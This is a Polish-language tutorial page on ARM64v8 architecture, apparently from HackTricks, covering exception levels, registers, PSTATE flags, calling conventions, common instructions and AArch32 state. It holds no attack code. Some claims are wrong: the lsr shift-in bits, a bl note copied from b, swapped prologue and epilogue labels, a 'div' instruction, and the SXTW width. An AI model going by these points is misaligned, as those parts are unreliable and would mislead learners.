# Wprowadzenie do ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Poziomy wyjątków - EL (ARM64v8)**

W architekturze ARMv8 poziomy wykonania, znane jako poziomy wyjątków (Exception Levels, EL), definiują poziom uprawnień i możliwości środowiska wykonawczego. Istnieją cztery poziomy wyjątków, od EL0 do EL3, z których każdy służy innemu celowi:

1. **EL0 - Tryb użytkownika**:
- Jest to poziom o najmniejszych uprawnieniach, używany do wykonywania zwykłego kodu aplikacji.
- Aplikacje działające na poziomie EL0 są od siebie odizolowane oraz odizolowane od software'u systemowego, co zwiększa bezpieczeństwo i stabilność.
2. **EL1 - Tryb jądra systemu operacyjnego**:
- Większość jąder systemów operacyjnych działa na tym poziomie.
- EL1 ma więcej uprawnień niż EL0 i może uzyskiwać dostęp do zasobów systemowych, ale z pewnymi ograniczeniami zapewniającymi integralność systemu. Z EL0 do EL1 przechodzi się za pomocą instrukcji SVC.
3. **EL2 - Tryb hypervisora**:
- Ten poziom jest używany do wirtualizacji. Hypervisor działający na poziomie EL2 może zarządzać wieloma systemami operacyjnymi (każdy we własnym EL1), działającymi na tym samym fizycznym sprzęcie.
- EL2 zapewnia funkcje izolacji i kontroli zwirtualizowanych środowisk.
- Aplikacje maszyn wirtualnych, takie jak Parallels, mogą używać `hypervisor.framework` do interakcji z EL2 i uruchamiania maszyn wirtualnych bez konieczności stosowania rozszerzeń jądra.
- Do przejścia z EL1 do EL2 używana jest instrukcja `HVC`.
4. **EL3 - Tryb Secure Monitor**:
- Jest to poziom o największych uprawnieniach, często używany do bezpiecznego uruchamiania i zaufanych środowisk wykonawczych.
- EL3 może zarządzać dostępem między stanami secure i non-secure (np. secure boot, trusted OS itd.).
- Był używany dla KPP (Kernel Patch Protection) w macOS, ale obecnie nie jest już wykorzystywany.
- Apple nie używa już EL3.
- Przejście do EL3 zwykle odbywa się za pomocą instrukcji `SMC` (Secure Monitor Call).

Użycie tych poziomów zapewnia uporządkowany i bezpieczny sposób zarządzania różnymi aspektami systemu — od aplikacji użytkownika po najbardziej uprzywilejowany software systemowy. Podejście ARMv8 do poziomów uprawnień pomaga skutecznie izolować poszczególne komponenty systemu, zwiększając tym samym bezpieczeństwo i odporność systemu.

## **Rejestry (ARM64v8)**

ARM64 ma **31 rejestrów ogólnego przeznaczenia**, oznaczonych od `x0` do `x30`. Każdy z nich może przechowywać wartość **64-bitową** (8 bajtów). W przypadku operacji wymagających tylko wartości 32-bitowych te same rejestry mogą być używane w trybie 32-bitowym pod nazwami w0 do w30.

1. **`x0`** do **`x7`** - Są zwykle używane jako rejestry tymczasowe oraz do przekazywania parametrów do podprogramów.
- **`x0`** przenosi również dane zwracane przez funkcję
2. **`x8`** - W jądrze Linux `x8` jest używany jako numer wywołania systemowego dla instrukcji `svc`. **W macOS używany jest do tego x16!**
3. **`x9`** do **`x15`** - Kolejne rejestry tymczasowe, często używane dla zmiennych lokalnych.
4. **`x16`** i **`x17`** - **Rejestry wywołań wewnątrzproceduralnych (Intra-procedural Call Registers)**. Rejestry tymczasowe dla wartości natychmiastowych. Są również używane do pośrednich wywołań funkcji i stubów PLT (Procedure Linkage Table).
- **`x16`** jest używany jako **numer wywołania systemowego** dla instrukcji **`svc`** w **macOS**.
5. **`x18`** - **Rejestr platformy**. Może być używany jako rejestr ogólnego przeznaczenia, ale na niektórych platformach jest zarezerwowany do zastosowań specyficznych dla platformy: jako wskaźnik do bloku środowiska bieżącego wątku w Windows lub do wskazywania **struktury aktualnie wykonywanego zadania w jądrze Linux**.
6. **`x19`** do **`x28`** - Są to rejestry zachowywane przez funkcję wywoływaną. Funkcja musi zachować wartości tych rejestrów dla wywołującego, więc są one zapisywane na stosie i odtwarzane przed powrotem do wywołującego.
7. **`x29`** - **Wskaźnik ramki** służący do śledzenia ramki stosu. Gdy tworzona jest nowa ramka stosu w wyniku wywołania funkcji, rejestr **`x29`** jest **zapisywany na stosie**, a adres nowego wskaźnika ramki (adres **`sp`**) jest **zapisywany w tym rejestrze**.
- Ten rejestr może być również używany jako **rejestr ogólnego przeznaczenia**, choć zwykle służy jako odniesienie do **zmiennych lokalnych**.
8. **`x30`** lub **`lr`** - **Rejestr łącza (Link register)**. Przechowuje **adres powrotu**, gdy wykonywana jest instrukcja `BL` (Branch with Link) lub `BLR` (Branch with Link to Register), zapisując wartość **`pc`** w tym rejestrze.
- Może być również używany jak każdy inny rejestr.
- Jeśli bieżąca funkcja ma wywołać nową funkcję i w związku z tym nadpisać `lr`, zapisze go na początku na stosie; jest to epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> zapis `fp` i `lr`, utworzenie miejsca i ustawienie nowego `fp`), a następnie odtworzy go na końcu; jest to prolog (`ldp x29, x30, [sp], #48; ret` -> odtworzenie `fp` i `lr` oraz powrót).
9. **`sp`** - **Wskaźnik stosu**, używany do śledzenia szczytu stosu.
- Wartość **`sp`** powinna być zawsze co najmniej **wyrównana do quadword**, w przeciwnym razie może wystąpić wyjątek wyrównania.
10. **`pc`** - **Licznik programu**, wskazujący następną instrukcję. Rejestr ten może być aktualizowany wyłącznie przez generowanie wyjątków, powroty z wyjątków i rozgałęzienia. Jedyne zwykłe instrukcje, które mogą odczytywać ten rejestr, to instrukcje branch with link (BL, BLR), zapisujące adres **`pc`** w **`lr`** (Link Register).
11. **`xzr`** - **Rejestr zerowy**. W 32-bitowej postaci rejestru nazywany również **`wzr`**. Może być używany do łatwego uzyskania wartości zero (częsta operacja) lub do wykonywania porównań za pomocą **`subs`**, np. **`subs XZR, Xn, #10`**, zapisując wynikowe dane nigdzie (w **`xzr`**).

Rejestry **`Wn`** są **32-bitową** wersją rejestrów **`Xn`**.

> [!TIP]
> Rejestry od X0 do X18 są volatile, co oznacza, że ich wartości mogą być zmieniane przez wywołania funkcji i przerwania. Rejestry od X19 do X28 są natomiast non-volatile, co oznacza, że ich wartości muszą być zachowane między wywołaniami funkcji („callee saved”).

### Rejestry SIMD i zmiennoprzecinkowe

Ponadto istnieją **32 kolejne rejestry o długości 128 bitów**, które mogą być używane w zoptymalizowanych operacjach single instruction multiple data (SIMD) oraz do wykonywania operacji arytmetycznych na liczbach zmiennoprzecinkowych. Są one nazywane rejestrami Vn, choć mogą również działać w trybie **64**-bitowym, **32**-bitowym, **16**-bitowym i **8**-bitowym; wówczas nazywane są odpowiednio **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.

### Rejestry systemowe

**Istnieją setki rejestrów systemowych**, nazywanych również rejestrami specjalnego przeznaczenia (SPR), używanych do **monitorowania** i **kontrolowania** zachowania **procesorów**.\
Można je odczytywać lub ustawiać wyłącznie za pomocą dedykowanych instrukcji specjalnych **`mrs`** i **`msr`**.

Specjalne rejestry **`TPIDR_EL0`** i **`TPIDDR_EL0`** są często spotykane podczas reverse engineeringu. Sufiks `EL0` wskazuje **minimalny poziom wyjątków**, z którego można uzyskać dostęp do rejestru (w tym przypadku EL0 jest zwykłym poziomem wyjątków (uprawnień), z którym działają zwykłe programy).\
Są one często używane do przechowywania **adresu bazowego** obszaru pamięci thread-local storage. Zwykle pierwszy z nich jest odczytywalny i zapisywalny przez programy działające w EL0, natomiast drugi może być odczytywany z EL0 i zapisywany z EL1 (np. przez kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** zawiera kilka komponentów procesu zserializowanych w widocznym dla systemu operacyjnego rejestrze specjalnym **`SPSR_ELx`**, gdzie X oznacza **poziom uprawnień** **wywołanego** wyjątku (pozwala to odtworzyć stan procesu po zakończeniu wyjątku).\
Dostępne są następujące pola:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Flagi warunków **`N`**, **`Z`**, **`C`** i **`V`**:
- **`N`** oznacza, że operacja zwróciła wynik ujemny
- **`Z`** oznacza, że operacja zwróciła zero
- **`C`** oznacza, że w operacji wystąpiło przeniesienie
- **`V`** oznacza, że operacja spowodowała przepełnienie ze znakiem:
- Suma dwóch liczb dodatnich daje wynik ujemny.
- Suma dwóch liczb ujemnych daje wynik dodatni.
- W odejmowaniu, gdy duża liczba ujemna jest odejmowana od mniejszej liczby dodatniej (lub odwrotnie), a wynik nie może być przedstawiony w zakresie określonym przez dany rozmiar bitowy.
- Oczywiście procesor nie wie, czy operacja jest ze znakiem, czy bez znaku, dlatego sprawdza `C` i `V` w operacjach oraz wskazuje, czy wystąpiło przeniesienie w przypadku operacji ze znakiem lub bez znaku.

> [!WARNING]
> Nie wszystkie instrukcje aktualizują te flagi. Niektóre, takie jak **`CMP`** lub **`TST`**, robią to, podobnie jak inne instrukcje z sufiksem s, np. **`ADDS`**.

- Bieżąca flaga **szerokości rejestru (`nRW`)**: Jeśli flaga ma wartość 0, po wznowieniu program będzie działać w stanie wykonania AArch64.
- Bieżący **poziom wyjątków** (**`EL`**): Zwykły program działający w EL0 będzie miał wartość 0
- Flaga **pojedynczego krokowania** (**`SS`**): Używana przez debuggery do wykonywania pojedynczych kroków poprzez ustawienie flagi SS na 1 wewnątrz **`SPSR_ELx`** za pośrednictwem wyjątku. Program wykona jeden krok i zgłosi wyjątek pojedynczego krokowania.
- Flaga stanu **nieprawidłowego wyjątku** (**`IL`**): Służy do oznaczania sytuacji, w której uprzywilejowany software wykonuje nieprawidłowe przejście poziomu wyjątków; flaga jest ustawiana na 1, a procesor wywołuje wyjątek nieprawidłowego stanu.
- Flagi **`DAIF`**: Flagi te pozwalają uprzywilejowanemu programowi selektywnie maskować określone wyjątki zewnętrzne.
- Jeśli **`A`** ma wartość 1, oznacza to, że będą wywoływane **asynchroniczne przerwania**. **`I`** konfiguruje reakcję na zewnętrzne sprzętowe **żądania przerwań** (IRQ), a `F` odnosi się do **szybkich żądań przerwań** (FIR).
- Flagi wyboru wskaźnika stosu (**`SPS`**): Uprzywilejowane programy działające w EL1 i wyżej mogą przełączać się między używaniem własnego rejestru wskaźnika stosu a rejestrem modelu użytkownika (np. między `SP_EL1` i `EL0`). Przełączanie to jest wykonywane przez zapis do rejestru specjalnego **`SPSel`**. Nie można tego zrobić z poziomu EL0.

## **Konwencja wywołań (ARM64v8)**

Konwencja wywołań ARM64 określa, że **pierwsze osiem parametrów** funkcji jest przekazywanych w rejestrach **`x0`** do **`x7`**. **Dodatkowe** parametry są przekazywane na **stosie**. Wartość **zwracana** jest przekazywana z powrotem w rejestrze **`x0`** lub również w **`x1`**, **jeśli ma długość 128 bitów**. Rejestry **`x19`** do **`x30`** oraz **`sp`** muszą być **zachowane** podczas wywołań funkcji.

Podczas odczytywania funkcji w assembly należy szukać **prologu i epilogu funkcji**. **Prolog** zwykle obejmuje **zapisanie wskaźnika ramki (`x29`)**, ustawienie **nowego wskaźnika ramki** oraz **przydzielenie miejsca na stosie**. **Epilog** zwykle obejmuje **odtworzenie zapisanego wskaźnika ramki** i **powrót** z funkcji.

### Konwencja wywołań w Swift

Swift ma własną **konwencję wywołań**, którą można znaleźć pod adresem [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Typowe instrukcje (ARM64v8)**

Instrukcje ARM64 mają zazwyczaj **format `opcode dst, src1, src2`**, gdzie **`opcode`** oznacza wykonywaną **operację** (np. `add`, `sub`, `mov` itd.), **`dst`** to rejestr **docelowy**, w którym zostanie zapisany wynik, a **`src1`** i **`src2`** to rejestry **źródłowe**. Zamiast rejestrów źródłowych można również używać wartości natychmiastowych.

- **`mov`**: **Przenosi** wartość z jednego **rejestru** do innego.
- Przykład: `mov x0, x1` — Przenosi wartość z `x1` do `x0`.
- **`ldr`**: **Ładuje** wartość z **pamięci** do **rejestru**.
- Przykład: `ldr x0, [x1]` — Ładuje do `x0` wartość z lokalizacji pamięci wskazywanej przez `x1`.
- **Tryb offsetu**: Offset wpływający na wskaźnik bazowy jest wskazany na przykład w następujący sposób:
- `ldr x2, [x1, #8]`, ładuje do x2 wartość z x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, ładuje do x2 obiekt z tablicy x0, z pozycji x1 (indeks) \* 4
- **Tryb pre-indexed**: Obliczenia zostaną zastosowane do wskaźnika bazowego, wynik zostanie pobrany, a nowy wskaźnik bazowy zostanie zapisany w rejestrze wskaźnika bazowego.
- `ldr x2, [x1, #8]!`, ładuje `x1 + 8` do `x2` i zapisuje w x1 wynik `x1 + 8`
- `str lr, [sp, #-4]!`, Zapisuje rejestr łącza w sp i aktualizuje rejestr sp
- **Tryb post-index**: Działa podobnie jak poprzedni, ale najpierw uzyskiwany jest adres pamięci, a następnie obliczany i zapisywany jest offset.
- `ldr x0, [x1], #8`, ładuje `x1` do `x0` i aktualizuje x1 wartością `x1 + 8`
- **Adresowanie względne względem PC**: W tym przypadku adres do załadowania jest obliczany względem rejestru PC
- `ldr x1, =_start`, Ładuje do x1 adres, pod którym rozpoczyna się symbol `_start`, względem bieżącego PC.
- **`str`**: **Zapisuje** wartość z **rejestru** do **pamięci**.
- Przykład: `str x0, [x1]` — Zapisuje wartość z `x0` w lokalizacji pamięci wskazywanej przez `x1`.
- **`ldp`**: **Load Pair of Registers**. Ta instrukcja **ładuje dwa rejestry** z **kolejnych lokalizacji pamięci**. Adres pamięci jest zwykle tworzony przez dodanie offsetu do wartości w innym rejestrze.
- Przykład: `ldp x0, x1, [x2]` — Ładuje `x0` i `x1` z lokalizacji pamięci znajdujących się odpowiednio pod `x2` i `x2 + 8`.
- **`stp`**: **Store Pair of Registers**. Ta instrukcja **zapisuje dwa rejestry** w **kolejnych lokalizacjach pamięci**. Adres pamięci jest zwykle tworzony przez dodanie offsetu do wartości w innym rejestrze.
- Przykład: `stp x0, x1, [sp]` — Zapisuje `x0` i `x1` w lokalizacjach pamięci znajdujących się pod `sp` i `sp + 8`.
- `stp x0, x1, [sp, #16]!` — Zapisuje `x0` i `x1` w lokalizacjach pamięci znajdujących się pod `sp+16` i `sp + 24`, a następnie aktualizuje `sp` wartością `sp+16`.
- **`add`**: **Dodaje** wartości dwóch rejestrów i zapisuje wynik w rejestrze.
- Składnia: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Cel
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (rejestr lub wartość natychmiastowa)
- \[shift #N | RRX] -> Wykonuje przesunięcie lub wywołuje RRX
- Przykład: `add x0, x1, x2` — Dodaje wartości `x1` i `x2` oraz zapisuje wynik w `x0`.
- `add x5, x5, #1, lsl #12` — Jest to równe 4096 (jedynka przesunięta 12 razy) -> 1 0000 0000 0000 0000
- **`adds`** Wykonuje operację `add` i aktualizuje flagi
- **`sub`**: **Odejmuje** wartości dwóch rejestrów i zapisuje wynik w rejestrze.
- Sprawdź **składnię** **`add`**.
- Przykład: `sub x0, x1, x2` — Odejmuje wartość `x2` od `x1` i zapisuje wynik w `x0`.
- **`subs`** Działa jak `sub`, ale aktualizuje flagi
- **`mul`**: **Mnoży** wartości **dwóch rejestrów** i zapisuje wynik w rejestrze.
- Przykład: `mul x0, x1, x2` — Mnoży wartości `x1` i `x2` oraz zapisuje wynik w `x0`.
- **`div`**: **Dzieli** wartość jednego rejestru przez inny i zapisuje wynik w rejestrze.
- Przykład: `div x0, x1, x2` — Dzieli wartość `x1` przez `x2` i zapisuje wynik w `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Przesunięcie logiczne w lewo**: Dodaje zera na końcu, przesuwając pozostałe bity do przodu (mnożenie przez n razy 2)
- **Przesunięcie logiczne w prawo**: Dodaje jedynki na początku, przesuwając pozostałe bity do tyłu (dzielenie bez znaku przez n razy 2)
- **Przesunięcie arytmetyczne w prawo**: Jak **`lsr`**, ale zamiast dodawania zer, gdy najbardziej znaczący bit ma wartość 1, dodawane są **jedynki (dzielenie ze znakiem przez n razy 2)
- **Rotacja w prawo**: Jak **`lsr`**, ale wszystko, co zostanie usunięte z prawej strony, jest dołączane z lewej
- **Rotacja w prawo z rozszerzeniem**: Jak **`ror`**, ale z flagą przeniesienia jako „najbardziej znaczącym bitem”. Flaga przeniesienia jest przenoszona na bit 31, a usunięty bit do flagi przeniesienia.
- **`bfm`**: **Bit Filed Move**; operacje te **kopiują bity `0...n`** z wartości i umieszczają je na pozycjach **`m..m+n`**. **`#s`** określa pozycję **najbardziej lewego bitu**, a **`#r`** wielkość rotacji w prawo.
- Bitfiled move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopiuje pole bitowe z jednego rejestru i kopiuje je do innego rejestru.
- **`BFI X1, X2, #3, #4`** Wstawia 4 bity z X2, zaczynając od 3. bitu X1
- **`BFXIL X1, X2, #3, #4`** Pobiera cztery bity z X2, zaczynając od 3. bitu, i kopiuje je do X1
- **`SBFIZ X1, X2, #3, #4`** Rozszerza znakowo 4 bity z X2 i wstawia je do X1, zaczynając od pozycji bitowej 3, wyzerowując prawe bity
- **`SBFX X1, X2, #3, #4`** Pobiera 4 bity, zaczynając od bitu 3 w X2, rozszerza je ze znakiem i umieszcza wynik w X1
- **`UBFIZ X1, X2, #3, #4`** Rozszerza zerami 4 bity z X2 i wstawia je do X1, zaczynając od pozycji bitowej 3, wyzerowując prawe bity
- **`UBFX X1, X2, #3, #4`** Pobiera 4 bity, zaczynając od bitu 3 w X2, i umieszcza wynik rozszerzony zerami w X1.
- **Rozszerzenie znaku do X:** Rozszerza znak (lub dodaje same zera w wersji bez znaku) wartości, aby można było wykonywać na niej operacje:
- **`SXTB X1, W2`** Rozszerza znak bajtu **z W2 do X1** (`W2` stanowi połowę `X2`), aby wypełnić 64 bity
- **`SXTH X1, W2`** Rozszerza znak liczby 16-bitowej **z W2 do X1**, aby wypełnić 64 bity
- **`SXTW X1, W2`** Rozszerza znak bajtu **z W2 do X1**, aby wypełnić 64 bity
- **`UXTB X1, W2`** Dodaje zera (bez znaku) do bajtu **z W2 do X1**, aby wypełnić 64 bity
- **`extr`:** Pobiera bity z określonej **pary połączonych rejestrów**.
- Przykład: `EXTR W3, W2, W1, #3` Spowoduje **połączenie W1+W2**, pobranie **od bitu 3 w W2 do bitu 3 w W1** i zapisanie wyniku w W3.
- **`cmp`**: **Porównuje** dwa rejestry i ustawia flagi warunków. Jest to **alias `subs`**, ustawiający rejestr docelowy na rejestr zerowy. Przydatne do sprawdzenia, czy `m == n`.
- Obsługuje **taką samą składnię jak `subs`**
- Przykład: `cmp x0, x1` — Porównuje wartości w `x0` i `x1` oraz odpowiednio ustawia flagi warunków.
- **`cmn`**: **Porównuje operand ujemny**. Jest to **alias `adds`** i obsługuje tę samą składnię. Przydatne do sprawdzenia, czy `m == -n`.
- **`ccmp`**: Porównanie warunkowe; porównanie zostanie wykonane tylko wtedy, gdy poprzednie porównanie było prawdziwe, i ustawi konkretnie bity nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> jeśli x1 != x2 i x3 < x4, skocz do func
- Dzieje się tak, ponieważ **`ccmp`** zostanie wykonane tylko wtedy, gdy **poprzednie `cmp` miało wynik `NE`**; jeśli nie, bity `nzcv` zostaną ustawione na 0 (co nie spełni warunku porównania `blt`).
- Można tego również użyć jako `ccmn` (analogicznie, ale dla wartości ujemnych, tak jak `cmp` względem `cmn`).
- **`tst`**: Sprawdza, czy którakolwiek z wartości porównania ma oba bity ustawione na 1 (działa jak `ANDS`, ale bez zapisywania wyniku). Jest przydatne do sprawdzenia rejestru względem wartości i ustalenia, czy którykolwiek bit rejestru wskazany w tej wartości ma wartość 1.
- Przykład: `tst X1, #7` Sprawdza, czy którykolwiek z ostatnich 3 bitów X1 ma wartość 1
- **`teq`**: Operacja XOR z odrzuceniem wyniku
- **`b`**: Bezwarunkowe rozgałęzienie
- Przykład: `b myFunction`
- Należy zauważyć, że nie wypełni to rejestru łącza adresem powrotu (nie nadaje się do wywołań podprogramów, które muszą powrócić)
- **`bl`**: **Rozgałęzienie** z łączem, używane do **wywołania** **podprogramu**. Zapisuje **adres powrotu w `x30`**.
- Przykład: `bl myFunction` — Wywołuje funkcję `myFunction` i zapisuje adres powrotu w `x30`.
- Należy zauważyć, że nie wypełni to rejestru łącza adresem powrotu (nie nadaje się do wywołań podprogramów, które muszą powrócić)
- **`blr`**: **Rozgałęzienie** z łączem do rejestru, używane do **wywołania podprogramu**, którego cel jest **określony w rejestrze**. Zapisuje adres powrotu w `x30`. (To jest
- Przykład: `blr x1` — Wywołuje funkcję, której adres znajduje się w `x1`, i zapisuje adres powrotu w `x30`.
- **`ret`**: **Powrót** z **podprogramu**, zwykle z użyciem adresu w **`x30`**.
- Przykład: `ret` — Powraca z bieżącego podprogramu, używając adresu powrotu w `x30`.
- **`b.<cond>`**: Rozgałęzienia warunkowe
- **`b.eq`**: **Rozgałęzienie, jeśli równe**, na podstawie poprzedniej instrukcji `cmp`.
- Przykład: `b.eq label` — Jeśli poprzednia instrukcja `cmp` stwierdziła równość dwóch wartości, następuje skok do `label`.
- **`b.ne`**: **Rozgałęzienie, jeśli różne**. Instrukcja sprawdza flagi warunków (ustawione przez poprzednią instrukcję porównania) i jeśli porównywane wartości były różne, wykonuje rozgałęzienie do etykiety lub adresu.
- Przykład: Po instrukcji `cmp x0, x1`, `b.ne label` — Jeśli wartości w `x0` i `x1` były różne, następuje skok do `label`.
- **`cbz`**: **Porównanie i rozgałęzienie dla zera (Compare and Branch on Zero)**. Instrukcja porównuje rejestr z zerem i jeśli są równe, wykonuje rozgałęzienie do etykiety lub adresu.
- Przykład: `cbz x0, label` — Jeśli wartość w `x0` wynosi zero, następuje skok do `label`.
- **`cbnz`**: **Porównanie i rozgałęzienie dla wartości różnej od zera (Compare and Branch on Non-Zero)**. Instrukcja porównuje rejestr z zerem i jeśli wartości są różne, wykonuje rozgałęzienie do etykiety lub adresu.
- Przykład: `cbnz x0, label` — Jeśli wartość w `x0` jest różna od zera, następuje skok do `label`.
- **`tbnz`**: Testuje bit i wykonuje rozgałęzienie, jeśli jest różny od zera
- Przykład: `tbnz x0, #8, label`
- **`tbz`**: Testuje bit i wykonuje rozgałęzienie, jeśli jest równy zero
- Przykład: `tbz x0, #8, label`
- **Operacje wyboru warunkowego**: Są to operacje, których zachowanie zależy od bitów warunków.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Jeśli prawda, X0 = X1, jeśli fałsz, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Jeśli prawda, Xd = Xn + 1, jeśli fałsz, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Jeśli prawda, Xd = NOT(Xn), jeśli fałsz, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = - Xm
- `cneg Xd, Xn, cond` -> Jeśli prawda, Xd = - Xn, jeśli fałsz, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = 1, jeśli fałsz, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = \<all 1>, jeśli fałsz, Xd = 0
- **`adrp`**: Oblicza **adres strony symbolu** i zapisuje go w rejestrze.
- Przykład: `adrp x0, symbol` — Oblicza adres strony `symbol` i zapisuje go w `x0`.
- **`ldrsw`**: **Ładuje** z pamięci wartość **32-bitową ze znakiem** i **rozszerza jej znak do 64** bitów. Jest to używane w typowych przypadkach SWITCH.
- Przykład: `ldrsw x0, [x1]` — Ładuje 32-bitową wartość ze znakiem z lokalizacji pamięci wskazywanej przez `x1`, rozszerza jej znak do 64 bitów i zapisuje ją w `x0`.
- **`stur`**: **Zapisuje wartość rejestru w lokalizacji pamięci**, używając offsetu względem innego rejestru.
- Przykład: `stur x0, [x1, #4]` — Zapisuje wartość z `x0` w adresie pamięci, który jest o 4 bajty większy niż adres znajdujący się obecnie w `x1`.
- **`svc`** : Wykonuje **wywołanie systemowe**. Jest to skrót od „Supervisor Call”. Gdy procesor wykonuje tę instrukcję, **przełącza się z trybu użytkownika do trybu jądra** i skacze do określonej lokalizacji w pamięci, w której znajduje się kod **obsługi wywołań systemowych jądra**.

- Przykład:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Prolog funkcji**

1. **Zapisz rejestr łącza i wskaźnik ramki na stosie**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Ustawienie nowego wskaźnika ramki**: `mov x29, sp` (ustawia nowy wskaźnik ramki dla bieżącej funkcji)
3. **Zarezerwowanie miejsca na stosie dla zmiennych lokalnych** (jeśli jest to wymagane): `sub sp, sp, <size>` (gdzie `<size>` to liczba wymaganych bajtów)

### **Epilog funkcji**

1. **Zwolnienie miejsca na zmienne lokalne** (jeśli zostało zarezerwowane): `add sp, sp, <size>`
2. **Przywrócenie rejestru linku i wskaźnika ramki**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (zwraca sterowanie do caller, używając adresu w link register)

## Common Memory Protections ARM

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## Stan wykonania AARCH32

Armv8-A obsługuje wykonywanie 32-bitowych programów. **AArch32** może działać w jednym z **dwóch instruction sets**: **`A32`** i **`T32`**, a także przełączać się między nimi za pomocą **`interworking`**.\
**Privileged** 64-bitowe programy mogą planować **wykonywanie 32-bitowych** programów, wykonując transfer poziomu wyjątków do niższego, uprzywilejowanego 32-bitowego poziomu.\
Należy zauważyć, że przejście z 64-bitów do 32-bitów odbywa się wraz z obniżeniem poziomu wyjątków (na przykład 64-bitowy program w EL1 uruchamiający program w EL0). Odbywa się to przez ustawienie **bitu 4** specjalnego rejestru **`SPSR_ELx`** **na 1**, gdy wątek procesu `AArch32` jest gotowy do wykonania, a pozostała część `SPSR_ELx` przechowuje CPSR programu **`AArch32`**. Następnie uprzywilejowany proces wywołuje instrukcję **`ERET`**, aby procesor przełączył się do **`AArch32`**, rozpoczynając działanie w A32 lub T32, zależnie od CPSR**.**

**`interworking`** odbywa się przy użyciu bitów J i T rejestru CPSR. `J=0` i `T=0` oznacza **`A32`**, a `J=0` i `T=1` oznacza **T32**. Zasadniczo oznacza to ustawienie **najmłodszego bitu na 1**, aby wskazać, że instruction set to T32.\
Jest to ustawiane podczas **instrukcji branch `interworking`,** ale można je również ustawić bezpośrednio za pomocą innych instrukcji, gdy PC jest ustawiony jako rejestr docelowy. Przykład:

Kolejny przykład:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Rejestry

Istnieje 16 32-bitowych rejestrów (r0-r15). **Od r0 do r14** mogą być używane do **dowolnej operacji**, jednak niektóre z nich są zwykle zarezerwowane:

- **`r15`**: Program counter (zawsze). Zawiera adres następnej instrukcji. W A32: bieżący adres + 8, w T32: bieżący adres + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (należy pamiętać, że stos jest zawsze wyrównany do 16 bajtów)
- **`r14`**: Link Register

Ponadto rejestry są przechowywane w **`banked registries`**. Są to miejsca przechowujące wartości rejestrów, umożliwiające **szybkie przełączanie kontekstu** podczas obsługi wyjątków i wykonywania uprzywilejowanych operacji, aby uniknąć konieczności ręcznego zapisywania i przywracania rejestrów za każdym razem.\
Odbywa się to poprzez **zapisanie stanu procesora z `CPSR` do `SPSR`** trybu procesora, do którego przekazywany jest wyjątek. Przy powrocie z wyjątku **`CPSR`** jest przywracany z **`SPSR`**.

### CPSR - Current Program Status Register

W AArch32 CPSR działa podobnie do **`PSTATE`** w AArch64 i jest również przechowywany w **`SPSR_ELx`**, gdy wystąpi wyjątek, aby później przywrócić wykonywanie:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Pola są podzielone na kilka grup:

- Application Program Status Register (APSR): Flagi arytmetyczne dostępne z EL0
- Execution State Registers: Zachowanie procesu (zarządzane przez system operacyjny).

#### Application Program Status Register (APSR)

- Flagi **`N`**, **`Z`**, **`C`**, **`V`** (tak samo jak w AArch64)
- Flaga **`Q`**: Jest ustawiana na 1, gdy podczas wykonywania wyspecjalizowanej instrukcji arytmetycznej z saturacją wystąpi **saturacja liczby całkowitej**. Po ustawieniu na **`1`** zachowuje tę wartość do momentu ręcznego ustawienia na 0. Ponadto nie istnieje instrukcja, która niejawnie sprawdza jej wartość — należy ją odczytać ręcznie.
- Flagi **`GE`** (Greater than or equal): Są używane w operacjach SIMD (Single Instruction, Multiple Data), takich jak „parallel add” i „parallel subtract”. Operacje te umożliwiają przetwarzanie wielu punktów danych w ramach jednej instrukcji.

Na przykład instrukcja **`UADD8`** **dodaje równolegle cztery pary bajtów** (z dwóch 32-bitowych operandów) i zapisuje wyniki w 32-bitowym rejestrze. Następnie **ustawia flagi `GE` w `APSR`** na podstawie tych wyników. Każda flaga GE odpowiada jednemu z dodawań bajtów i wskazuje, czy dodawanie dla danej pary bajtów **spowodowało przepełnienie**.

Instrukcja **`SEL`** używa tych flag GE do wykonywania warunkowych działań.

#### Execution State Registers

